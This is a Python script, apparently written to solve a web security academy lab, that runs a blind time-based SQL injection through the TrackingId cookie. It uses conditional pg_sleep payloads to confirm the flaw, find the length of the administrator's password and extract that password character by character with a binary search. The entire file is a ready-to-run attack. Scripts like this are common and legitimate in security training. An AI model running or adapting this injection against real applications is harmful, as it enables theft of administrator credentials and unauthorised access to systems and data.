import requests
import time
import sys

# Usage: python3 solve_lab.py <URL> [DELAY]
# Example: python3 solve_lab.py https://...web-security-academy.net/ 3

def check_condition(url, payload, delay):
    headers = {
        "Cookie": f"TrackingId=x'; {payload}--"
    }
    start = time.time()
    try:
        # We use a timeout slightly larger than the delay to catch the response
        r = requests.get(url, headers=headers, timeout=delay + 10)
        duration = time.time() - start
        return duration >= delay
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        # print(f"[-] Error: {e}")
        return False

def get_password_length(url, delay):
    print("[+] Determining password length...")
    # Testing lengths from 1 to 30
    for i in range(1, 31):
        payload = f"SELECT CASE WHEN (username='administrator' AND LENGTH(password)={i}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users"
        if check_condition(url, payload, delay):
            print(f"[+] Password length is: {i}")
            return i
    return None

def get_password(url, length, delay):
    print("[+] Extracting password (Binary Search)...")
    password = ""
    for i in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            # Check if ASCII value is greater than mid
            payload = f"SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{i},1)) > {mid}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END FROM users"
            if check_condition(url, payload, delay):
                low = mid + 1
            else:
                high = mid - 1
        
        password += chr(low)
        print(f"[+] Character {i}: {chr(low)} (Current: {password})")
    return password

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 solve_lab.py <URL> [DELAY]")
        sys.exit(1)
    
    target_url = sys.argv[1]
    delay = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Delay: {delay}s")
    
    print("[+] Verifying vulnerability with 1=1...")
    if check_condition(target_url, f"SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END", delay):
        print("[+] Vulnerability verified (Condition 1=1 triggered delay).")
        
        print("[+] Verifying 1=2 does NOT trigger delay...")
        if not check_condition(target_url, f"SELECT CASE WHEN (1=2) THEN pg_sleep({delay}) ELSE pg_sleep(0) END", delay):
            print("[+] Verification complete (Condition 1=2 did not trigger delay).")
            
            length = get_password_length(target_url, delay)
            if length:
                password = get_password(target_url, length, delay)
                print(f"\n[!] Successfully extracted password: {password}")
            else:
                print("[-] Could not determine password length.")
        else:
            print("[-] False positive detected (1=2 also triggered delay). Try increasing the delay.")
    else:
        print("[-] Delay test failed. Check the URL or ensure the lab instance is active.")
